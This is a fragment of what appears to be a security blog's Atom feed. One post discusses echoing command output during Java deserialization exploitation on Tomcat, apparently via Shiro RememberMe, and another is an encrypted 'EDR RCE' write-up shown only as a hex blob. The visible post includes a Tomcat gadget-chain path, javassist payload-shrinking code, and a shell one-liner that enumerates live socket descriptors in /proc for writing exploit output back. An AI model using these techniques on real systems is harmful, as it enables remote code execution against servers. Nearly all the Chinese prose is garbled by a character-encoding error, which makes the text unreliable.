Âπ∂ÂàùÂßãÂåñ<br>(ObjectInputStream‰∏≠ËÆæÁΩÆ‰∏∫ false Êú™ÂàùÂßãÂåñ)</td></tr></tbody></table><p>ËøòÊòØÊ≤°ÊêûÊáÇÈóÆÈ¢òÂá∫Ëá™Âì™ÈáåÔºåÂè¶ÁΩë‰∏äÊúâÊèêÂèäÁöÑ‰∏ÄÂ§ÑÂå∫Âà´Ôºà<strong>Ê≥®ÊÑèÔºÅÊúâÈóÆÈ¢òÔºÅ</strong>Ôºâ</p><blockquote><p>ÊòØÂê¶‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûã<br>1ÔºâClass.forName‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûãÔºåÂ¶Ç[Ljava.lang.String;<br>2ÔºâClassLoader‰∏ç‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûãÔºåÂä†ËΩΩÊó∂‰ºöÊäõÂá∫ClassNotFoundException;</p></blockquote><p>‰ΩÜÊòØÁªèÊµãËØïWebAppClassLoaderÊòØÊúâËÉΩÂäõËß£ÊûêÊï∞ÁªÑÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979768116938.jpg" alt="-w631"></p><p>ÊúÄÂêéÂèëÁé∞ÂÖ≥ÈîÆÁÇπÂú®‰∫éorg.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)ÔºåÂú®Ë∞ÉÁî® Class.forName Êó∂<strong>ÊåáÂÆö‰ªéÁà∂Á±ªÂêë‰∏äÊêúÂØª</strong>ÔºåÂØºËá¥Êâæ‰∏çÂà∞<code>[Lorg.apache.commons.collections4.Transformer;</code>Á±ª</p><table><thead><tr><th align="center">ÂèÇÊï∞</th><th align="center">parent</th><th align="center">this</th></tr></thead><tbody><tr><td align="center">ClassLoader</td><td align="center">URLClassLoader</td><td align="center">WebappClassLoader</td></tr><tr><td align="center">ÊµãËØï</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885531644.jpg" alt="-w1260"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885797767.jpg" alt="-w1260"></td></tr></tbody></table><p>ÂÖ≥‰∫éWebappClassLoader‰∏éÂÖ∂‰ªñ ClassLoader ÂèØËØ¶ÁªÜÈòÖËØªÊ≠§ÁØáÊñáÁ´†Ôºö<a href="https://www.cnblogs.com/aspirant/p/8991830.html" target="_blank" rel="noopener">ÂõæËß£TomcatÁ±ªÂä†ËΩΩÊú∫Âà∂</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979903825787.jpg" alt></p><blockquote><ol><li>WebappClassLoaderÔºöÂêÑ‰∏™WebappÁßÅÊúâÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂä†ËΩΩË∑ØÂæÑ‰∏≠ÁöÑclassÂè™ÂØπÂΩìÂâçWebappÂèØËßÅ</li><li>tomcat ‰∏∫‰∫ÜÂÆûÁé∞ÈöîÁ¶ªÊÄßÔºåÊ≤°ÊúâÈÅµÂÆàÂèå‰∫≤ÂßîÊ¥æËøô‰∏™Á∫¶ÂÆöÔºåÊØè‰∏™webappClassLoaderÂä†ËΩΩËá™Â∑±ÁöÑÁõÆÂΩï‰∏ãÁöÑclassÊñá‰ª∂Ôºå‰∏ç‰ºö‰º†ÈÄíÁªôÁà∂Á±ªÂä†ËΩΩÂô®</li></ol></blockquote><p>ËÄå<code>commons-collections4-4.0.jar</code>‰Ωç‰∫é webapp ‰∏≠È°πÁõÆ /WEB-INF/lib ‰∏ãÔºåÂú®Ê≤°ÊúâÂÖ∂‰ªñÈ¢ùÂ§ñÈÖçÁΩÆ CLASSPATH ÁöÑÊÉÖÂÜµÊó∂ÔºåÈªòËÆ§Âè™Êúâ WebappClassLoader ÊâçËÉΩÂä†ËΩΩ</p><p><strong>ÊâÄ‰ª• Tomcat ‰∏∫‰ªÄ‰πàÊêúÁ¥¢ÊåáÂÆöÁà∂Á±ªÂºÄÂßãÔºüËøô‰∏™ËÆæËÆ°Â∞±ÂæàËø∑ü§îü§îü§î</strong></p><h2 id="V-ÂõûÊòæ"><a href="#V-ÂõûÊòæ" class="headerlink" title="V. ÂõûÊòæ"></a>V. ÂõûÊòæ</h2><p>Âú®ÈÅáÂà∞Âá†Ê¨°ÁõÆÊ†áÂêéÔºå‰ºöÂèëÁé∞ÊúâÁöÑËÆæÂ§áÊòØ‰∏çÂá∫ÁΩëÁöÑÔºåÂì™ÊÄïÁ¢∞ÊíûÂá∫‰∫Ü key ‰πü‰∏çÊ∏ÖÊ•öÊòØÂê¶Ê≠£Â∏∏ÊâßË°å‰∫ÜÂëΩ‰ª§ÔºåËøôÊó∂ÂÄôÂõûÊòæÁöÑËÉΩÂäõÂ∞±ÂæàÈáçË¶Å</p><p>Âõ†‰∏∫ÂØπÂõûÊòæÊ≤°ÊúâÁ†îÁ©∂ÔºåÁúã‰∫ÜÂÖ∂‰ªñÂ∏àÂÇÖÁöÑÊñáÁ´†ÔºåÊåâÁÖß<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">00thewayÂ∏àÂÇÖ</a>ËÆ≤ÁöÑÔºåÁõÆÂâçÂÖ¨ÂºÄÁöÑÂ§ßÊ¶ÇÊúâ‰ª•‰∏ãÂá†ÁßçÊñπÂºèËé∑ÂèñÁªìÊûúÔºö</p><ol><li>Êä•ÈîôÂõûÊòæ</li><li>web‰∏≠Ëé∑ÂèñÂΩìÂâç‰∏ä‰∏ãÊñáÂØπË±°Ôºàresponse„ÄÅcontext„ÄÅwriterÁ≠âÔºâ</li><li>ÂèØ‰ª•Âá∫ÁΩëÊÉÖÂÜµ‰∏ãOOB</li></ol><p>Âà©Áî®ÊïàÊûúÊØîËæÉÂ•ΩÁöÑÊúâ‰ª•‰∏ã‰∏§‰∏™ÔºåÂâçËÄÖÈÄÇÁî® Linux/Windows TomcatÔºåÂêéËÄÖÈÄÇÁî® Linux ÂêÑÁ±ªÂú∫ÊôØÔºåÂêÑÊúâ‰ºòÂäøÔºåÊåâÂú∫ÊôØÂà©Áî®</p><ol><li>Âü∫‰∫é Tomcat ResponseÔºö <a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">https://koalr.me/post/shiro-lou-dong-jian-ce/</a></li><li>Âü∫‰∫é Linux SocketÔºö <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">https://www.00theway.org/2020/01/17/java-god-s-eye/</a></li></ol><h3 id="1-Tomcat-Gadget"><a href="#1-Tomcat-Gadget" class="headerlink" title="1. Tomcat Gadget"></a>1. Tomcat Gadget</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981176541010.jpg" alt="-w1100"></p><h4 id="ÂéüÁêÜ-2"><a href="#ÂéüÁêÜ-2" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>ÁºñËØë java-object-searcher ‰∏∫ jarÔºåÊñπ‰æøÂºïÁî®</p><pre class=" language-shell"><code class="language-shell">$> mvn clean package -Dmaven.test.skip=true</code></pre><p>ÊãâÂèñ Tomcat (ÈùûÊ∫êÁ†Å)ÔºåÂàõÂª∫‰∏Ä‰∏™ Tomcat È°πÁõÆÔºåÂπ∂Ëá™Ë°åÂàõÂª∫‰∏Ä‰∏™ Servlet Áî®‰∫éÊñ≠ÁÇπË∞ÉËØï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981590274384.jpg" alt="-w1443"></p><p>ÊµãËØï Tomcat 8.0.39 ÁéØÂ¢É‰∏ãÂÆûÈôÖÂè™Êúâ‰∏ÄÊù° gadget</p><pre class=" language-plain"><code class="language-plain">TargetObject = {org.apache.tomcat.util.threads.TaskThread}   ---> group = {java.lang.ThreadGroup}    ---> threads = {class [Ljava.lang.Thread;}     ---> [5] = {java.lang.Thread}      ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}       ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}         ---> handler = {org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler}          ---> global = {org.apache.coyote.RequestGroupInfo}           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}            ---> [0] = {org.apache.coyote.RequestInfo}             ---> req = {org.apache.coyote.Request}</code></pre><p>Âú®ËøôÈáåÂèàÈÅáÂà∞‰∫Ü cookie ËøáÂ§ßÁöÑÊÉÖÂÜµÔºåËß£ÂÜ≥ÊñπÊ≥ïËØ∑ÁúãËøôÁØá<a href="https://xz.aliyun.com/t/6227" target="_blank" rel="noopener">Áº©Â∞èysoserial payload‰ΩìÁßØÁöÑÂá†‰∏™ÊñπÊ≥ï</a></p><p>‰ΩøÁî® javassist Âä†ËΩΩÁõÆÊ†áÁ±ªÔºåÂØºËá¥‰ΩìÁßØËøáÂ§ß</p><pre class=" language-java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CtClass clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981183428132.jpg" alt="-w676"></p><p>ËΩ¨Âèò‰∏∫‰ΩøÁî® javassist Áõ¥Êé•ÂàõÂª∫Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981184068390.jpg" alt="-w656"></p><p>ÊàëËøôÈáåÂè™ÊòØÂÆûÁé∞ DemoÔºåÊ≤°ÊúâÂØπÂêÑ‰∏™ Tomcat ÁâàÊú¨‰ª•Âèä CC gadget ÂÅöÂÖºÂÆπÔºåËøô‰ΩçÂ∏àÂÇÖÂÆûÁé∞ÂØπÂà©Áî®ÈìæÊõ¥ÂπøÊ≥õÁöÑÂÖºÂÆπÔºö<a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">Shiro RememberMe ÊºèÊ¥ûÊ£ÄÊµãÁöÑÊé¢Á¥¢‰πãË∑Ø</a></p><h3 id="2-Linux-Socket"><a href="#2-Linux-Socket" class="headerlink" title="2. Linux Socket"></a>2. Linux Socket</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980718016937.jpg" alt="-w1145"></p><h4 id="ÂéüÁêÜ-3"><a href="#ÂéüÁêÜ-3" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>Âü∫‰∫é Linux ‰∏áÁâ©ÁöÜÊñá‰ª∂ÁöÑÊÄßË¥®ÔºåÂØπ‰∫éÊØè‰∏Ä‰∏™ÈìæÊé• socket ÈÉΩÊúâÂÖ∂ÂØπÂ∫îÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ÔºåÈÄöËøáÁõ¥Êé•ÂêëÊñá‰ª∂ÊèèËø∞Á¨¶ÂÜôÂÖ•ÂÜÖÂÆπÂÆûÁé∞ÂõûÊòæ</p><p>ÊúâÈÉ®ÂàÜÊñáÁ´†‰ΩøÁî®ÊòØ<strong>Â∞ùËØïÈÄöËøá IP„ÄÅPORT ËøõË°åËøáÊª§Ëé∑Âèñ inode ÂÄºÂêéÔºåÂÜçËé∑Âèñ fd ÂÜôÂÖ•</strong>ÔºåËøô‰∏™ÊñπÊ≥ïÊúâ‰∏Ä‰∏™ÂæàÂ§ßÁöÑÈóÆÈ¢òÂú®‰∫éÂ¶ÇÊûúÁõÆÊ†á‰Ωç‰∫éË¥üËΩΩ„ÄÅ‰ª£ÁêÜ‰πãÂêéÁöÑÂ§çÊùÇÁΩëÁªúÔºåÊòØÊ≤°ÊúâÂäûÊ≥ïÁ≠õÈÄâÂá∫ÊúâÊïàÁöÑËØ∑Ê±ÇÊ∫êÔºåÂØºËá¥ÊñπÊ≥ïÂ§±Ë¥•</p><p><strong>ÊâÄ‰ª•ÊàëÈááÁî®ÈÄöËøáËé∑ÂèñÊâÄÊúâÊúâÊïà inode ÂÄºÔºåÂÜçËé∑Âèñ fd ÁªÑÔºåÁªü‰∏ÄÂ∞ùËØïÂÜôÂÖ•ÔºåÁ™ÅÁ†¥Â§çÊùÇÁΩëÁªúÔºåÂÆûÁé∞ÂõûÊòæ</strong>üòà</p><p>È¶ñÂÖà‰∫ÜËß£‰∏ã /proc/self/net/tcp</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980738788715.jpg" alt="-w722"></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/net/tcp_states.h</span><span class="token keyword">enum</span> <span class="token punctuation">{</span>    TCP_ESTABLISHED <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    TCP_SYN_SENT<span class="token punctuation">,</span>    TCP_SYN_RECV<span class="token punctuation">,</span>    TCP_FIN_WAIT1<span class="token punctuation">,</span>    TCP_FIN_WAIT2<span class="token punctuation">,</span>    TCP_TIME_WAIT<span class="token punctuation">,</span>    TCP_CLOSE<span class="token punctuation">,</span>    TCP_CLOSE_WAIT<span class="token punctuation">,</span>    TCP_LAST_ACK<span class="token punctuation">,</span>    TCP_LISTEN<span class="token punctuation">,</span>    TCP_CLOSING<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/* Now a valid state */</span>    TCP_NEW_SYN_RECV<span class="token punctuation">,</span>    TCP_MAX_STATES    <span class="token comment" spellcheck="true">/* Leave at the end! */</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>ÂÖ≥Ê≥®Âà∞ connection state Ê†áÂøóÔºåÈÄöËøáÂà§Êñ≠ÊòØÂê¶‰∏∫1Â∞±ÂèØ‰ª•Á≠õÈÄâÊ≠£Âú®‰º†ËæìÁöÑ socket ÁöÑ inode ÂÄº</p><p>‰πãÂêéÈÄöËøáÁ≠õÈÄâ /proc/self/fd ‰∏≠ socket[<inode>] ÂØπÂ∫îÊñá‰ª∂ÊèèËø∞Á¨¶ÂÄºÔºåÈÅçÂéÜÂ∞ùËØïÂÜôÂÖ•Âç≥ÂèØ</inode></p><p>‰∏ãÈù¢ÊòØÊàëÁî®Êù•Á≠õÈÄâÁöÑËØ≠Âè• Orz</p><pre class=" language-shell"><code class="language-shell">$ > inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4=="01")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;$ > 97-57-</code></pre><p>ÂéüÊú¨ÊòØÊÉ≥ÈÄöËøáÂÖ®ÈÉ®Áî± JAVA ÂéüÁîü‰ª£Á†ÅÂÆûÁé∞ÔºåÁªìÊûúÂèëÁé∞ÁîüÊàêÁöÑ Payload ÈïøÂ∫¶Ë∂ÖÂá∫‰∫Ü Cookie or Header Length ÈôêÂà∂ÔºåÈô§ÈùûÂè¶Âà©Áî® gadget Âéª‰øÆÊîπÔºåÂê¶Âàô‰ºöËß¶Âèë ERROR 400ÔºåÂêéÈù¢ÂèëÁé∞Áî® shell Áõ¥Êé•ËøáÊª§ fd  Êõ¥Êñπ‰æøÂø´Êç∑</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://xz.aliyun.com/t/6227#toc-4" target="_blank" rel="noopener">Áº©Â∞èysoserial payload‰ΩìÁßØÁöÑÂá†‰∏™ÊñπÊ≥ï</a></li><li><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">ÈÄöÊùÄÊºèÊ¥ûÂà©Áî®ÂõûÊòæÊñπÊ≥ï-linuxÂπ≥Âè∞</a></li><li><a href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo" target="_blank" rel="noopener">ÂçäËá™Âä®ÂåñÊåñÊéòrequestÂÆûÁé∞Â§öÁßç‰∏≠Èó¥‰ª∂ÂõûÊòæ</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‰∏ÄÊ¨°ÈÅáÂà∞Ê°à‰æãÔºåÂà©Áî®ÈÉ®ÂàÜÂ∑•ÂÖ∑Êó†Ê≥ïÊúâÊïàÂÆûÁé∞ÊâßË°å„ÄÅÂõûÊòæÔºå‰∫éÊòØÊúâ‰∫ÜÊ≠§ÁØá&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Ê∑±‰ø°Êúç EDR RCE ÁÆÄÊûê</title>
    <link href="https://blog.sari3l.com/posts/6712089c/"/>
    <id>https://blog.sari3l.com/posts/6712089c/</id>
    <published>2020-08-18T03:23:31.000Z</published>
    <updated>2020-08-26T06:40:20.190Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e6b3455a09d258c5b541c30a30c1ab04f6b7aa4f35923d5f7b4015e7361a84b2">1ad572fb57cc2956496dcc52e0ea2dafde82954dd73786338ce22b313cc2edf7ae82eedee8487532a9704898b35bb4f4a2a5460f41189e96c3aafa27e4c11f66fab69ef5fade1a3a2a5d151255daab0a483521b64c1421fb5ca0bb3b80f3e146052d737e595a9427d19d8f4f5c1a246ab4f6244d2e113690cf68b65f2128507ded19f269efe2b7e84c16f1180d47c13c319f5dc81a981ddf3c31102d12b19423dde7793bb0462b1c0245f038c413e6c60850f402ec462f1a6b5e1f0ac6d521a30ed3de4cfa3d5c746e80386d1a0c32396bce36f6df4ff5c3d68c31b3f1d2318b12ad95aa21e88ae77304b044615115555de18a072e7c8a17275bc6f21837c9464856214cc4ec2d5928fb6f3c9977a40d21705861c4d4fece39583b69c74b2571fd2f756ce260a6dfdd577e6423d3f16123846e34966f7fc9dbb83a249aaa4ffb5faee3cc00db83ebcc7d3f74b945b959045b7e1b001ab5a012b694bfbc746ae1d3a11a352d3d41023782bc3b65df538e144bbb23286d201891d1876e8ca4d0952835be04c799f48a07cf362bbe7dcdc99f53358eae5834d0f1f0336b4084b668ac20d882f2f0627143ebb6e22b4476b7cb3168bb3fe93b68717a14aaa435c3ceb5d3d26831db10654d4334447fba55aad139f6e3c1c3c660cf50b2172d4439545ecf6500ab852484594d8577cc3bd6adf53c16b3a2f7f9a247660f75cfacc95de488ab176a32eda9ae9db86396936d16d1056015d9e92e48f0de3b3d2fc565c7bd474c7f82eac9d47b3ca2ec29d6d3f7d2263a2883576d33395877d52f5cddff21427de7a91879105e7b69cac5f32cd54a55bab4c04cb12ca4b7251e1e6db2d39ad5bb9c9f7cddd6d1fee6997b169afa85a48c75c241e4ba182cbb44c0bde95349bc7fe60c18afdb4b7bbb584b51306561c0f9667757482f050653d55a3bc54a65125a5c64d26042fac30737d1f5f399a694c648017eac818adec81e8179a1c4122f51906986337910fc853aa7ba7411f0d12dd0159055548fd52b58a10a85c31f67cee354cfbff83692238299dde63ebb620678f55463fb4865369c37b5a788f09d45dee6c87d09767908ea23a5efde8ef32040c01734dcab5f9c1fdae3f8c5b60c38dae1acb3a3d06353a1cb03ddaaac262a9abd0b076a72c93f4846d1ca73f2c131ff2b31ea82866ca6dcc7dc2e9269adae27cc0426ec062297704b402bb928ded9fb0b3019e2b2efb57256ad2ca49d9d0a7cfb153f9f027be9ef3e5f504d30add0285d8060ca464ebb62163619b9a58627c7737d2cd1f2b158bf1656b5f192bb3f9a223772c88d808133b8936566dd840749f87441ea5df4b70125a197b37b92aaffa9a9b546427d7097c7b7f4de3f29d2ef6808e485b60a2c5ede9f98ca8899663eb46727f572cbf488a1158d4f93280794aaf3bdaaa73868b99086f048e02a1b1b268fbc53202d002b933a7f0f32eb99d96288a45dd9e08af14f1d7901cdd3f2d432e76122cb8b5d65e90442d0e3da5741ff9e4870e00638d7a731cc698d66232569333a34e052d8bb0d0e6f89ede2ce3c0b7e9b8e612c608ebb1d2271b329fbb30f6f336a45df1f1d98d91176db51f22857313347c56f5c5de985973a8117d2e613ac7746024b7b8f6913d388eea5fb9ae700edd5754099add515ca52dd4d416c8a7551f11ccca1d61930fe11850577314e1ed3a68d3a0631d5c4b5dbf979ea11ec061daaaa8305ff06b49c3c5e13b1bc8babfc3e078a92f8bba14b9500ca96db1d0b483230c6d2241cec79dad03d13a6b31c4f082d5a633cfca9daa4068aee2ce6d7282b7c7b9c15ad0c88924daafbf574295ab858110d1a523afbe6754fe1808707e472d8e50228ebb0a2f5d9219a381681827f4299dafa63ef3a74344dfdb84220090d187ecda0f3390b7f74e2bba2641a91bdafd394e22f7de1b8f5312c847ca94cb612804e7dc956d26b892a1767d4bf04d818e0fefdc69ad10ef9a832fe8a85a9a33077cf2f739d5833a7f8ccd34f118e4d9e29d3bce4ebbf89dbc3779411529749db10bfe15e740d308c7fb26e78ae286927f3acd589414e06692553493b9df083cf0d7115f22e45440aab8c123cca0013383656f0f869ad02ceb0aed2657727d627399f2f82d263ccf8b6b5868afc2f01ecc5a416e6fe684baee373c16263833ae26280aab1bc374ff719b8382326878c4078095c893823a10f37df0bd0d96cb0e0914a2b560fe3c75997713a3cbe1137ad39104555c3d6d65a790eac7a03b29d8772a9102f5f589cbc000ad973f68bf2d18675541387e0c90bf7a17edca8d471debf65089fd85afa2436c14793341048d0bfdef9a002a21061723735c8aeaacef7ee99e91c25551f9f012de1996cddd41d9a5b2aae9c4eedd57cb570145fc4d90a20a16bd2a3300992c825c36be4c54ccbee8e87b8776b6f0ed137b6fe59091377b5a2307e45c3f90d691b80f7e8048bcc33f18c8f6b82dc3ecd21088201b0769b609de2cd6e32266b04c8b404b10871abd2eb464e97f0a5ae980152b29349bbeb8ad5b4d47bf7f5f2ca2e7b0ec8f7c0f8ee1fe3ef1a21e7813dc750403b6041653601c2683d500076da34a82539ae236a044bd8fa22c29fba798173348aca9c3423f959f6d15cad92c63d2d8a89da96fd41857e0783427eeeec95d4c3154403bb4beaaa8e862a584a79907404bc3d877baeb379718451acbf749d5ef28b92eba597f2bbe778d4273f563422b1f799a65a2544b9977c3e0f5c2d487279cc4bc1433ab0dcd37d43d22abf6d3497eb5e01941f44115e3ff9e35a2a470701176f6d68005e70dc7512c9e19e5338d88129bc970276e04a13f393b2da65b42c7836f7a334108b0fbd2150ee3185705ce2c1d8fc2ef669865069e91357b808e0cd41ead6484c4611000c40a2a0e1341bd7f390794f451ae25a9e108f380f7f5908240d65badfc2a9416fecb54392f90e8171c5750cc2acdc2212ed679fb32b091c0d7ff21cffea1556861a8f281185790d0e64812673500d1518f1399d90ed85e81d295a94c6a548e21f7781e9d7a69b59d1fabc54e18062b0c12e139af117a226c9efbfb0fb372f1cd9cf1ade16ac3e7d7d16ec0ec09e167fda6029ab95d967f11090f720e95b92b1b118d306590f8d806ba016f166a9072f76fe5df972de29c7dc88ca3ae1f9f8c78291fd3821493effc68c1102a4291b3d4d472e1fd316bcc3d8e7411e44b2ad6738794ac734da18bc4876cf0be1543a620c1ac7a3b309ec3364d661da9146d983103df780738c4e571b5251be7cddaba6b667449c868628f93a436463e6f32819465d8c67ad8e88c6f740a82fd68623d6a60b6f31a9879d2d4ae69b6508589375bfbf2f1abee8ba798edfbfb04568bec2c4b57ec57628d5bb8742cf14b5f951125a56b5ae437becb0ac3fa550e72419f114ab783c33c31f537ea3c2b2d41d74792d101e0e40110a6c736a49dbdd3b8b7e7c5dd94bdc80cbb690c145403aa9cf3cca1e149a792d78e0f5e5c60f4e7cf03cc49b63e42e24f50bcd29f27de324adedec098267d83651af72a6600a8bb8a0e7380b0436b30c501babc06f46d75bbd1804db05110fd603f9a42ecb00b5456eea937e0dba5dde56d9fdff30bce4bd9c9488312d6e8eb4a1010ac1c0d3182c1bd705999d83b07011d6465b3c016c56bb9259b9dd5c4b6fa42a12520c43e94adb6e63a7d0dd388796362336cec26ffac1e48d3646e69d815a8ad48eb873fb26f1806fd911f253d29c710f4eb7984937eb026e62812e17943ee7fcd49ce74e3112cc275cfaf4035e608333d098a84ff8d133ce67d495834360681162de157d848986fbf2db6306f4ab569b430964ecc2ed6aae53b6f74daa43343b72dc831cd833bade08d8798e66f2b33e4326b947074dc431102505842a1c02c41bbf3294a256b41d1e39cf9fd5ebeb04985157fa62763df53f26e63e6b77d492053c3bdba94de75b6b00176a980f95672e22e9987dc09169d3b7ebe062aabbf055fb0bfeaa9848005f1650a870147e0b612867a8c2ecf956d41fb1e78c9474ee5b156b4165bc9becc0ea70440135f36e820c43177dfd3ffb58bd7a73c6e451757bbd55286bed93d6efb0da125c459a9fafde2b945ba38c1fb0361c7e4d6173dead21d288e942fe70c419f8c271d847b34c863bce55152bf6ec7b1bf08773a4d40dc728bb2e7c752765e77ca51f8f4c52e3ad962e1619a3a24ef7a7cc9189c5b7551a95311cc03af4019594860532505302df0668cdd1ec1857c915f0e934474620e27f3245028b633aaeff5408579967098be03e5c16bf54b7c9f86178fc63d49486817f9a601fdb6ed55b89229b90c274e166cf63c9be88c5b640f2ded8b008a6011474e65fd8ea05ab8a881ca62b828173d2e0999610944d0db88d43804cbc1be84cba5c5a3b8304c35412e654349e6ac2acc7e046776a387af21d5c75463a247cc400b91b292974ede6d21caff069f6710d8eacce7b30c446e7a55908db2470370bbd8f4a12655fc4908687aaec60840df4b4b51131e396f843db063dd04088c7ddd553638b71c1a6b3e53d9dbb8bff3dab0dc8c4cba82fc6d432254b431591230661d5c13818d72870f4bd98c0960e98067e851163a73a61ee9c1cf02c01adf158e18363998c54c7d29382a0ab5f41e3ed9339cdb91d60b751a6fe0153061c24f5a21e8a61a47c1e223d1c96e1c2b095e57c1ffd86f753e1296203473217588a43da167eea7ac4ab1cdbdf79a02b6e61b06455c54cced360c36b7fb7751452dfc0b21e81c1e4245382ac7a645551f892e411fcb42e44f1fea843febdf017980a920bbb3306ab0105b3227047effd7912a0508aa050f98713a41a8161c6a8b1036d30b39d337c852f718cc8d882f2b8dc0a0741ac991577487cc287c451f4de1c35d111113cb3000ba2dd95fe718c62cbe1dc6c61acdfb640b06bf44d75fee5dcd4f69ef5ef95ed71f09c4a5cc937896009a76c46c68d0855009d116339611a1ca05be93e163577e644ed5f5c03feeedca5e3f6c396c3e50b6cd231bff06e23ad63d932bf2b5e63537b6debc84d9807fabf793704b9b7ad5d239fb37cd064edefeafd1618e863d914003af99a6bc0aae31462b4f15936f8a52d3ca1e9d6250e92d71734b55b975760917fb2ef505772528ba38d25dc3b302f6c1dac1caf7ff0caa4b2358c42533712009ec1390c0798c32e4141c18917e0d03ead04270f8e4bafb8333298f7a3a03ac3cc31d15d3991b78875f3a0be5e8711afed8440534da2685b1e54e075954462ee776269372a7ab66d6c839045ce256ae46e2657244cfd4fab1a4a2b3900c9a81b3b179930aaf3a43a7e495fd6339149b2cb3d4799823eedae2b7c20dc7584124d025f43e724cf1afafaab7a8d4a0c43914507455022c3f7b4f397d17cc61c112b8d12546c40fc3a92a05f3fd238af86260e9fa26ea90926b970e3e72a0c09405d94e71b1213f4c82d5f7d2da35e05e9fd95f22e7f960d205b9d4503e592877e3728a63b1011381fceaabeb1be8f378d1d6198f158079656182acd4e0430ea4eee92173a09e9c00531e1706eb6680b7041d6ebe20b3e82fa7d5066b71e1d6198160296d3a43fe0fc3cf37f597b912d2af73fae35d6cc8fc201dec5131f2540ea2e13ac7c76a21ec0f2d0622e61618aef86285a2fcf989948516069470f50c00df79d49e74188e2355dea62e5ab07ebaf0035be0d14d600999ec6fa7fb4c36451a135ad4dbdf3b55dc511b4167d666f71ee2c7edbcb087bd47be241127c5d9db43835a8f788e8ab1f15d6fe62e8208fcab96b9abcfb394433ca4eac64cb69728271051ebb5aaba16d8465b467a625bbf1a4d236d447bb33bac249d36249c1d42dc32056da31148218b85e0cb531da60604d65736de0daf910e884a8da6454fed6f0c9785c53e1ea5c877f9323b5b0f91369a4fe6cf07946729fcc1ea130255f8a8e50c54e988bbac767109bd94e1e14b6d42a7dcf0b6a2fcf3ec323c364bb5ef11008373cee82296a5f69a66d6f4a232198c28296676a68ce8743e5c490de74d51a0d844295a19006f256eaaee0717a05cf8affc1d55d41df7816104737f36428d90790e9fc0725178a73b6e1d6e26a54bdc917b42dda7d8b19d72a99ead5ef388bb137bac0f5928e1d738af06a60b64e2cfc8610d9e3b83e072bcd4d17f512327e8e7da4223a21ae0d70364c7403a2e18a265ab458098bccf51b2291daa66eb92ae35fb3c41be2619a583a48bd8eb1e65b82b